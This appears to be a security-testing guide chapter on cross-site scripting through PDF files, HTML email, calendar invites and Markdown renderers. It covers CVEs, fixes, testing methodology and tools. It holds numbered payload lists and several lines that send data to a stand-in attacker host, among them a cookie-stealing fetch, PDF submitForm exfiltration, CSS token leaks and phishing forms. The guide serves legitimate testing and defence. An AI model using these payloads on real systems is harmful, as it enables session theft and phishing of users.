# 26 - PDF, Email & Markdown XSS

## Overview

PDF documents, HTML emails, and Markdown content each involve complex rendering pipelines that transform structured input into visual output. Each pipeline introduces unique XSS opportunities: PDFs contain a full scripting engine; webmail clients must sanitize HTML email bodies while preserving formatting; and Markdown renderers convert plaintext-like syntax into HTML. These three contexts share a common trait - they all involve translating one format into browser-renderable HTML, and each translation step is a potential injection point.

**Sources**: [Codean Labs - CVE-2024-4367](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/), [PortSwigger - Portable Data Exfiltration](https://portswigger.net/research/portable-data-exfiltration), [Sonar - Roundcube Webmail XSS](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/), [HackTricks - XSS in Markdown](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown)

---

## 1. PDF XSS

### 1.1 JavaScript Actions in PDFs

PDF supports JavaScript natively through action objects. These execute automatically or on user interaction:

**OpenAction (auto-execute on open):**
```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('XSS via PDF')) >>
endobj
```

**Named actions:**
```
/AA << /O << /S /JavaScript /JS (app.alert({cMsg:'XSS',cTitle:'PDF'})) >> >>
```

**Page-level triggers:**
```
/Type /Page
/AA <<
  /O << /S /JavaScript /JS (app.alert('Page opened')) >>
  /C << /S /JavaScript /JS (app.alert('Page closed')) >>
>>
```

PDF JavaScript can access:
- `app.alert()` - Display dialog boxes
- `app.launchURL()` - Open URLs
- `this.submitForm()` - Submit form data to external URLs (data exfiltration)
- `app.openDoc()` - Open other documents
- `util.printf()` - Format strings (historically exploitable for buffer overflow)

### 1.2 Form Field Injection

PDF forms contain fields whose values can include JavaScript:

```
/Type /Annot
/Subtype /Widget
/FT /Tx
/AA <<
  /F << /S /JavaScript /JS (app.alert('focus')) >>
  /Bl << /S /JavaScript /JS (app.alert('blur')) >>
  /K << /S /JavaScript /JS (app.alert('keystroke')) >>
>>
```

When a user interacts with the form field, the JavaScript executes. This is relevant when web applications dynamically generate PDFs from user input and embed that input into form fields without proper escaping of PDF special characters (particularly parentheses).

### 1.3 Annotation Injection

PDF annotations (links, notes, highlights) can contain URIs and JavaScript actions:

**Link annotation with JavaScript:**
```
/Type /Annot
/Subtype /Link
/A << /S /JavaScript /JS (this.submitForm('https://attacker.com/steal?data='+this.info.title)) >>
/Rect [0 0 612 792]
```

**SubmitForm action for data exfiltration:**
```
/Type /Action
/S /SubmitForm
/F (https://attacker.com/collect)
/Flags 4
```

PortSwigger research demonstrated that PDF injection through user-controlled annotation text can escape the PDF string context using unbalanced parentheses, enabling injection of arbitrary PDF objects and actions.

**Annotation injection exploitation:**
The most likely targets for injection are text streams or annotations, as these objects allow developers to embed text or a URI enclosed within parentheses. If a malicious user can inject unescaped parentheses, they can escape the string context and inject PDF code, including JavaScript actions or SubmitForm actions.

**Source**: [PortSwigger - Portable Data Exfiltration: XSS for PDFs](https://portswigger.net/research/portable-data-exfiltration)

### 1.4 PDF Reader Vulnerabilities

Different PDF readers have different JavaScript sandboxes and parsing behaviors:

| Reader | JavaScript Support | XSS Risk |
|--------|-------------------|----------|
| Adobe Acrobat/Reader | Full JS engine | High (privileged context) |
| Chrome PDFium | Limited JS | Medium (annotations, forms) |
| Firefox PDF.js | Web-based rendering | High (runs in browser context) |
| Safari Preview | No JS | Low |
| Edge (Chromium) | Same as Chrome | Medium |
| Online PDF viewers (web apps) | Varies | High (often runs in app origin) |

### 1.5 CVE-2024-4367: PDF.js Arbitrary JavaScript Execution

**Vulnerability**: A missing type check in PDF.js font processing allowed arbitrary JavaScript execution when opening a malicious PDF.

**Technical details**: The `FontMatrix` property in PDF font definitions is expected to contain numeric values used in a `transform` operation. The code failed to validate that these values were actually numbers. An attacker could embed a malicious object in the FontMatrix that, when processed by the rendering pipeline, was evaluated as JavaScript code.

**Impact**: This affected all Firefox users (< 126) since Firefox uses PDF.js as its built-in PDF viewer. Any web application using PDF.js (< 4.2.67) for PDF preview was also vulnerable. The code runs under the `resource://pdf.js` origin in Firefox, which has slightly elevated privileges compared to regular web pages.

**Exploitation details**:
- Attacker creates a PDF with a custom FontMatrix containing JavaScript
- When PDF.js processes the font, the malicious value bypasses type checking
- JavaScript executes in the PDF.js rendering context
- Can trigger file downloads, spy on file paths, and potentially escalate

**Workaround**: Set `isEvalSupported` to `false` in PDF.js configuration.

**Fix**: Update to PDF.js >= 4.2.67 or Firefox >= 126.

**Source**: [Codean Labs - CVE-2024-4367](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/), [Exploit-DB #52273](https://www.exploit-db.com/exploits/52273), [GitHub Advisory GHSA-wgrm-67xf-hhpq](https://github.com/advisories/GHSA-wgrm-67xf-hhpq)

---

## 2. Email XSS

### 2.1 HTML Email Rendering in Webmail

Webmail clients render HTML emails in the browser, creating a significant XSS attack surface. The email body is essentially untrusted HTML that must be sanitized before rendering in the webmail application's origin.

**Core challenge**: Webmail must preserve email formatting (fonts, colors, tables, images) while stripping all executable content (scripts, event handlers, dangerous CSS).

**Common sanitization approaches:**
- Element/attribute whitelisting
- CSS property filtering
- URL scheme filtering (block `javascript:`, `data:`, `vbscript:`)
- Namespace stripping (remove SVG, MathML)
- `<iframe>` sandboxing of email content

### 2.2 Webmail-Specific Bypasses

#### Roundcube Webmail

**CVE-2024-42009 (Critical)**: Stored XSS requiring zero interaction beyond viewing the email. The vulnerability existed in the `message_body()` function in `program/actions/mail/show.php`, exploiting a desanitization issue.

**Attack flow:**
1. Attacker sends a crafted email to the victim
2. Victim opens the email in Roundcube webmail
3. XSS payload executes immediately - no clicks needed
4. Attacker steals emails, contacts, and email passwords
5. Attacker can send emails from the victim's account

**Advanced exploitation**: Using the XSS to install a malicious Service Worker (via an email attachment containing the SW script), enabling persistent access to all future Roundcube page loads. The Service Worker adds email- or password-stealing logic on every page load.

**CVE-2024-42008**: A second XSS vulnerability in Roundcube exploitable when a victim clicks a malicious link in a specially crafted email while having a malicious email open in the browser.

**CVE-2024-42010**: Insufficient CSS filtering allowed information leakage via crafted email messages.

**Source**: [Sonar - Roundcube Webmail XSS](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/), [Help Net Security - Roundcube CVEs](https://www.helpnetsecurity.com/2024/08/07/cve-2024-42009-cve-2024-42008/)

#### MDaemon Webmail

**CVE-2024-11182**: XSS vulnerability in the MDaemon Email Server webmail component. Exploitable with network access, requires user interaction, low attack complexity.

**Source**: [CVE-2024-11182 Details](https://stack.watch/vuln/CVE-2024-11182/)

#### State-Sponsored Exploitation Campaigns

**Operation Roundcube (Sednit/APT28)**: Beginning in 2023, the Sednit group targeted government and defense entities using XSS vulnerabilities in webmail platforms including Roundcube, Horde, MDaemon, and Zimbra. The malicious code was embedded in the HTML body of email messages and was not directly visible to users.

**Source**: [ESET - Webmail XSS Attacks](https://www.eset.com/blog/en/business-topics/threat-landscape/webmail-xss-attacks-smbs/), [The Hacker News - Roundcube XSS Credential Theft](https://thehackernews.com/2024/10/hackers-exploit-roundcube-webmail-xss.html)

#### Gmail, Outlook, Yahoo Considerations

Major webmail providers employ sophisticated sanitization but have had historical bypasses:

- **Gmail**: Uses AMP for Email rendering, strict CSP, iframe sandboxing. Historical bypasses involved CSS-based data exfiltration, DOM clobbering
- **Outlook.com/OWA**: Different rendering engine for Outlook.com vs desktop Outlook. CSS parsing differences create bypass opportunities
- **Yahoo Mail**: Has had multiple documented XSS vulnerabilities through sanitization bypasses involving HTML attributes and CSS

**Common patterns across webmail:**
- CSS `@import` and `url()` for data exfiltration
- `<base>` tag injection to redirect relative URLs
- Form injection (phishing within email context)
- `<meta>` tag injection for redirects

### 2.3 Email Header Injection Leading to HTML Body

If an application has email header injection, attackers can inject the email body:

```
From: attacker@evil.com
Subject: Normal Subject\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>
```

The CRLF injection in the Subject header allows the attacker to terminate the headers and inject an HTML body that overwrites or supplements the legitimate email content.

### 2.4 Calendar Invite Injection

Calendar invites (ICS/iCalendar format) rendered in webmail can contain HTML in description fields:

```ics
BEGIN:VCALENDAR
BEGIN:VEVENT
SUMMARY:Meeting
DESCRIPTION:<img src=x onerror=alert(document.domain)>
DTSTART:20240101T090000Z
DTEND:20240101T100000Z
END:VEVENT
END:VCALENDAR
```

If the webmail client renders the DESCRIPTION field as HTML without sanitization, XSS occurs when the user views the calendar invite.

### 2.5 Rich Text Email XSS

RTF (Rich Text Format) emails processed by webmail clients undergo RTF-to-HTML conversion. Malformed RTF can produce HTML that bypasses sanitization:

```rtf
{\rtf1 {\*\htmltag84 <script>alert(1)</script>}}
```

RTF `\htmltag` control words embed raw HTML that may survive conversion and bypass sanitizers expecting standard RTF formatting.

---

## 3. Markdown XSS

### 3.1 Markdown-to-HTML Renderer Bypasses

Markdown is not a standard - multiple implementations exist with different parsing behaviors, creating a fragmented security landscape.

**Basic Markdown XSS vectors:**

```markdown
[click me](javascript:alert(1))

[XSS](javascript:alert(document.domain))

[XSS](javascript&#58;alert(1))

[XSS](j&#97;v&#97;script:alert(1))

![alt](https://attacker.com/img.jpg"onload="alert(1))

![alt text](x"onerror=alert(1)//)
```

**Source**: [HackTricks - XSS in Markdown](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown), [Markdown XSS Payloads Repository](https://github.com/cujanovic/Markdown-XSS-Payloads)

### 3.2 GitHub Flavored Markdown (GFM) XSS

GitHub's Markdown renderer is heavily hardened, but other implementations of GFM parsing are often vulnerable:

**Historically exploited in GFM-compatible renderers:**
```markdown
<!-- Raw HTML (if allowed) -->
<details open ontoggle=alert(1)>
<summary>Click</summary>
</details>

<!-- SVG in Markdown -->
<svg onload=alert(1)>

<!-- Image with event handler -->
<img src=x onerror=alert(1)>

<!-- iframe injection -->
<iframe srcdoc="<script>alert(1)</script>">
```

GitHub itself strips most dangerous HTML, but many applications that claim "GFM compatibility" do not implement the same level of sanitization.

### 3.3 CommonMark Vulnerabilities

CommonMark is a strongly specified Markdown standard. Implementations like `comrak` (Rust), `commonmark.js`, and `cmark` follow the spec, but the spec itself allows raw HTML by default:

```markdown
This is normal text.

<div onmouseover="alert(1)">Hover me</div>

More normal text.
```

CommonMark parsers that do not strip/escape raw HTML blocks (the default behavior per spec) are inherently vulnerable to XSS. The `UNSAFE` rendering option in many CommonMark implementations allows raw HTML through.

**comrak** (Rust CommonMark + GFM implementation) provides security options:
```rust
// Safe mode (strips raw HTML)
let options = ComrakOptions {
    extension: ComrakExtensionOptions { ..Default::default() },
    render: ComrakRenderOptions {
        unsafe_: false,  // Do not allow raw HTML
        ..Default::default()
    },
    ..Default::default()
};
```

**Source**: [comrak - CommonMark + GFM parser](https://github.com/kivikakk/comrak)

### 3.4 Custom Renderer Bypasses

Many applications implement custom Markdown renderers or extend existing ones. Common bypass patterns:

**Link protocol bypass:**
```markdown
[XSS](javascript:alert(1))           # Blocked
[XSS](Javascript:alert(1))           # Case variation
[XSS](JaVaScRiPt:alert(1))          # Mixed case
[XSS](javascript&#58;alert(1))       # HTML entity colon
[XSS](&#106;avascript:alert(1))      # HTML entity j
[XSS]( javascript:alert(1))          # Leading space
[XSS](	javascript:alert(1))          # Leading tab
[XSS](javascript:alert(1))  # URL-encoded newline
[XSS](data:text/html,<script>alert(1)</script>) # data: URI
[XSS](vbscript:alert(1))             # vbscript: (legacy IE)
```

**Nuxt MDC XSS (GHSA-cj6r-rrr9-fg82)**: XSS in the `@nuxtjs/mdc` Markdown content library through `<base>` element injection. The parser allowed `<base>` elements that redirect relative URLs to attacker-controlled origins. Additionally, unsafe parsing logic of URL text extracted from Markdown content led to `javascript:` protocol bypass.

**Source**: [Nuxt MDC XSS Advisory](https://github.com/nuxt-content/mdc/security/advisories/GHSA-cj6r-rrr9-fg82), [Node.js Security - Nuxt MDC XSS](https://www.nodejs-security.com/blog/nuxt-mdc-xss-vulnerability)

**CVE-2024-41662 (VNote)**: XSS in Markdown rendering of VNote (note-taking application) led to Remote Code Execution. The Markdown renderer did not sanitize HTML, and since VNote is an Electron application, XSS escalated to RCE through Node.js integration.

**Source**: [CVE-2024-41662 - VNote Markdown XSS to RCE](https://github.com/sh3bu/CVE-2024-41662)

### 3.5 Link Injection in Markdown

Even without JavaScript execution, link injection in Markdown can enable phishing:

```markdown
Click [here](https://attacker.com/phishing) to verify your account.

See the [updated policy](https://evil.com/fake-login)
```

If the Markdown is rendered in a trusted context (e.g., support ticket, internal wiki), users are more likely to trust the links.

**Autolink injection**: Some Markdown renderers automatically convert URLs to links. An attacker can inject URLs in user-generated content:
```markdown
Visit https://attacker.com/steal-creds for more info
```

### 3.6 Image with Event Handlers

When Markdown renderers allow HTML attributes on images:

```markdown
![alt](x" onerror="alert(1))

![XSS](https://attacker.com/img.jpg "title" onload="alert(1))
```

In renderers that pass through raw HTML:
```markdown
<img src="x" onerror="alert(1)">

<img src="valid.jpg" onload="alert(1)">
```

---

## 4. Cross-Context Attack Chains

### 4.1 PDF -> Webmail XSS Chain

1. Attacker sends an email with a PDF attachment containing JavaScript
2. Webmail renders PDF preview using PDF.js or embedded viewer
3. PDF JavaScript executes in the webmail's origin context
4. Attacker accesses webmail session cookies, reads other emails

### 4.2 Markdown -> Stored XSS Chain

1. Attacker submits Markdown content through a comment, issue, or wiki
2. Server renders Markdown to HTML without proper sanitization
3. Stored HTML payload executes when other users view the content
4. Attacker escalates via session hijacking or account takeover

### 4.3 Email -> Service Worker Persistence

1. Attacker sends crafted email exploiting webmail XSS (e.g., CVE-2024-42009)
2. XSS installs a Service Worker from an email attachment
3. Service Worker intercepts all future webmail requests
4. Attacker has persistent access even after the original email is deleted

---

## 5. PDF/Email/Markdown XSS Payloads

### PDF Payloads

```
// 1. PDF OpenAction JavaScript
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>

// 2. PDF SubmitForm data exfiltration
<< /Type /Action /S /SubmitForm /F (https://attacker.com/collect) /Flags 4 >>

// 3. PDF annotation link with JavaScript
<< /Type /Annot /Subtype /Link /A << /S /JavaScript /JS (this.submitForm('https://attacker.com/?d='+this.info.title)) >> >>

// 4. PDF form field with JavaScript trigger
<< /Type /Annot /Subtype /Widget /FT /Tx /AA << /F << /S /JavaScript /JS (app.alert('focus')) >> >> >>

// 5. PDF.js CVE-2024-4367 FontMatrix injection (conceptual)
// Embed malicious object in /FontMatrix array of font definition
// Object evaluates as JavaScript during transform operation
```

### Email XSS Payloads

```html
<!-- 6. Basic HTML email XSS (targets weak sanitizers) -->
<img src=x onerror=alert(document.domain)>

<!-- 7. CSS animation trigger (Roundcube-style) -->
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart="alert(1)"></div>

<!-- 8. SVG in email body -->
<svg onload="alert(document.cookie)">

<!-- 9. Base tag injection for URL hijacking -->
<base href="https://attacker.com/">
<a href="/login">Click to verify</a>

<!-- 10. Form injection in email -->
<form action="https://attacker.com/phish" method="POST">
  <input type="text" name="password" placeholder="Confirm password">
  <input type="submit" value="Verify">
</form>

<!-- 11. CSS data exfiltration (leak CSRF tokens) -->
<style>
  input[name="csrf"][value^="a"] { background: url(https://attacker.com/leak?csrf=a); }
  input[name="csrf"][value^="b"] { background: url(https://attacker.com/leak?csrf=b); }
</style>

<!-- 12. Calendar invite XSS -->
DESCRIPTION:<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

### Markdown XSS Payloads

```markdown
<!-- 13. JavaScript link -->
[XSS](javascript:alert(document.domain))

<!-- 14. Data URI link -->
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

<!-- 15. Raw HTML in Markdown (CommonMark default) -->
<details open ontoggle=alert(1)>
<summary>Click</summary>
</details>

<!-- 16. Image with onerror -->
<img src=x onerror=alert(1)>

<!-- 17. SVG in Markdown -->
<svg/onload=alert(document.domain)>

<!-- 18. Iframe injection -->
<iframe srcdoc="<script>alert(origin)</script>">

<!-- 19. Link with javascript protocol (entity encoded) -->
[XSS](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))

<!-- 20. Base tag injection in Markdown -->
<base href="https://attacker.com">

[Login](./login)
```

---

## 6. Testing Methodology

### PDF XSS Testing

**Step 1**: Identify PDF generation and rendering
- Find features that generate PDFs from user input (invoices, reports, exports)
- Find PDF upload and preview functionality
- Identify the PDF renderer (PDF.js, Adobe, browser native)

**Step 2**: Test PDF injection points
- Inject PDF special characters (`(`, `)`, `\`) in all user inputs that end up in PDFs
- Test with parenthesis-breaking payloads to escape string contexts
- Test JavaScript actions in annotations and form fields

**Step 3**: Test PDF.js version
- Check if the application uses PDF.js and identify the version
- Test CVE-2024-4367 if version < 4.2.67
- Upload malicious PDFs and check if they render with JavaScript

### Email XSS Testing

**Step 1**: Identify webmail rendering
- Determine the webmail platform (Roundcube, OWA, Zimbra, custom)
- Identify the sanitization library used
- Test HTML rendering capabilities

**Step 2**: Send test emails
- Send HTML emails with progressive payloads (start simple, increase complexity)
- Test SVG, MathML, and namespace confusion payloads in email body
- Test CSS-based attacks (exfiltration, animation triggers)
- Test base tag injection and form injection

**Step 3**: Test calendar and attachment rendering
- Send calendar invites with HTML in description fields
- Test attachment preview functionality for XSS
- Test PDF attachments rendered inline

### Markdown XSS Testing

**Step 1**: Identify Markdown input points
- Comments, issue trackers, wikis, documentation, README rendering
- User profiles with Markdown bio/description fields
- Chat applications with Markdown support

**Step 2**: Test HTML passthrough
- Inject raw HTML tags in Markdown content
- Test `<script>`, `<img>`, `<svg>`, `<iframe>`, `<details>`
- Check if the renderer strips or passes through raw HTML

**Step 3**: Test link protocols
- Test `javascript:`, `data:`, `vbscript:` in links
- Test entity encoding, case variations, whitespace injection
- Test autolink behavior with malicious URLs

**Step 4**: Test renderer-specific bypasses
- Identify the exact Markdown library and version
- Search for known CVEs and bypasses for that library
- Test edge cases in the specific implementation

---

## 7. Tools

```bash
# Generate malicious PDF with JavaScript
# Using PayloadsAllThePDFs
git clone https://github.com/luigigubello/PayloadsAllThePDFs
cd PayloadsAllThePDFs

# Send HTML email for webmail testing (using swaks)
swaks --to victim@target.com \
  --from attacker@evil.com \
  --header "Content-Type: text/html" \
  --body '<html><body><img src=x onerror=alert(1)></body></html>' \
  --server mail.target.com

# Test Markdown XSS payloads (from cujanovic collection)
git clone https://github.com/cujanovic/Markdown-XSS-Payloads

# Check PDF.js version
curl -s https://target.com/path/to/pdf.js | grep -i "version\|pdfjsVersion"

# Generate base64 data URI payload for Markdown
echo -n '<script>alert(document.domain)</script>' | base64
# Use in: [XSS](data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+)
```

---
## [2024-2026 Research Update]

### PDF.js CVE-2024-4367: Arbitrary JavaScript Execution via Font Parsing

**Affected versions**: PDF.js < 4.2.67, Firefox < 126
**CVSS**: High

**Technical deep-dive**: The vulnerability exists in PDF.js's font handling for Type 1 fonts. The `FontMatrix` property, which should contain numeric values for glyph transformation, lacked type validation. An attacker could embed a malicious object in the `FontMatrix` array that, when processed by the glyph path compilation pipeline, was evaluated as JavaScript code rather than treated as a numeric transformation parameter.

**Exploitation chain** (academic case study from OJS deployment):
1. Open redirect in host platform's sign-out handler
2. Prefix-match URL validation weakness in PDF.js viewer wrapper
3. CVE-2024-4367 font parsing behavior for JavaScript execution
4. Full XSS in the application's origin context

**Impact scope**:
- All Firefox users (< 126) -- PDF.js is the built-in PDF viewer
- Any web application using PDF.js (< 4.2.67) for inline PDF rendering
- Code runs under `resource://pdf.js` origin in Firefox (slightly elevated privileges)
- Can trigger file downloads, spy on file paths, and potentially escalate to further exploitation

**Reproduction steps**:
1. Create a PDF with a custom Type 1 font definition
2. Replace numeric values in the `FontMatrix` array with a JavaScript payload
3. Upload the PDF to a target using PDF.js for rendering
4. When the PDF is opened, the font processing pipeline evaluates the payload

**Workaround**: Set `isEvalSupported` to `false` in PDF.js configuration.
**Fix**: Update to PDF.js >= 4.2.67 or Firefox >= 126.

**Source**: [Codean Labs](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/), [Exploit-DB #52273](https://www.exploit-db.com/exploits/52273), [OJS exploitation chain](https://ejournal.uin-suka.ac.id/saintek/JISKA/article/download/6353/3098/19996)

### Gmail AMP DOM Clobbering

**Vulnerability**: DOM clobbering bypass in Gmail's AMP for Email rendering.

AMP for Email relies on an allowlist of tags and attributes to block XSS. However, allowed `id` attributes on permitted elements enabled DOM clobbering attacks. Researchers found that clobbering specific DOM properties used by AMP's internal sanitization or rendering logic could bypass the XSS protections.

**Key insight**: DOM clobbering in email contexts is particularly effective because email HTML sanitizers typically remove `<script>` tags and event handlers, but `id` and `name` attributes on allowed elements often survive the sanitizer. These clobbered properties can interfere with the rendering engine's security checks.

**Status**: Google patched the vulnerability.

**Source**: [PortSwigger Daily Swig](https://portswigger.net/daily-swig/google-fixes-xss-bug-in-gmails-dynamic-email-feature), [Sophos](https://news.sophos.com/?p=459857)

### FairEmail CVE-2026-54521: AMP Email XSS in Android

**Affected versions**: FairEmail < 1.2319
**CVSS**: 6.1 (Medium)

**Vulnerability**: The Android email app FairEmail enabled JavaScript in its WebView but did not fully sanitize message HTML. A crafted AMP email could execute arbitrary JavaScript when opened with the AMP toggle enabled.

**Conditions**:
- Victim must have AMP email rendering enabled in FairEmail settings
- Attacker sends a crafted AMP-format email
- JavaScript executes in the WebView context when the email is opened

**Impact**: Limited exposure because AMP email is uncommon, but when triggered, provides full JavaScript execution in the WebView context of the email app.

**Fix**: Update to FairEmail >= 1.2319.

**Source**: [OpenCVE](https://app.opencve.io/cve/CVE-2026-54521)

### Showdown CVE-2026-59710: Stored XSS via Table Header ID Injection

**Affected versions**: Showdown (unpatched npm release at time of disclosure)
**Parser function**: `parseHeaders` in `src/subParsers/makehtml/tables.js`

**Vulnerability**: The `parseHeaders` function does not escape table header ID attributes. When Showdown generates HTML from Markdown tables, header content is used to construct `id` attributes without sanitization, allowing attribute injection.

**Exploitation**:
```markdown
| Header" onmouseover="alert(1) |
|------|
| data |
```

Rendered HTML:
```html
<th id="Header" onmouseover="alert(1)">Header" onmouseover="alert(1)</th>
```

**Status**: Fix pushed to master branch but not yet published to npm at time of disclosure.

**Source**: [OpenCVE](https://app.opencve.io/cve/CVE-2026-59710), [Snyk SNYK-JS-SHOWDOWN-17874450](https://security.snyk.io/vuln/SNYK-JS-SHOWDOWN-17874450)

### Showdown CVE-2026-104477: Unescaped URL Attributes

**Affected versions**: Showdown through 2.1.0
**CVSS**: 5.3 (Medium)

**Vulnerability**: The `makehtml` link and image subparsers fail to escape double quotes in destination URLs placed into `href` and `src` attributes. This allows breaking out of the attribute context and injecting event handlers.

**Exploitation**:
```markdown
[Click me](https://example.com/page" onmouseover="alert(document.cookie))

![Alt text](https://example.com/img.jpg" onerror="alert(1))
```

**Key context**: Showdown explicitly states it does not include XSS filtering, and that filtering should be done after Showdown has processed input. Applications using Showdown without post-processing sanitization (e.g., DOMPurify) are vulnerable.

**Source**: [OpenCVE](https://app.opencve.io/cve/CVE-2026-104477)
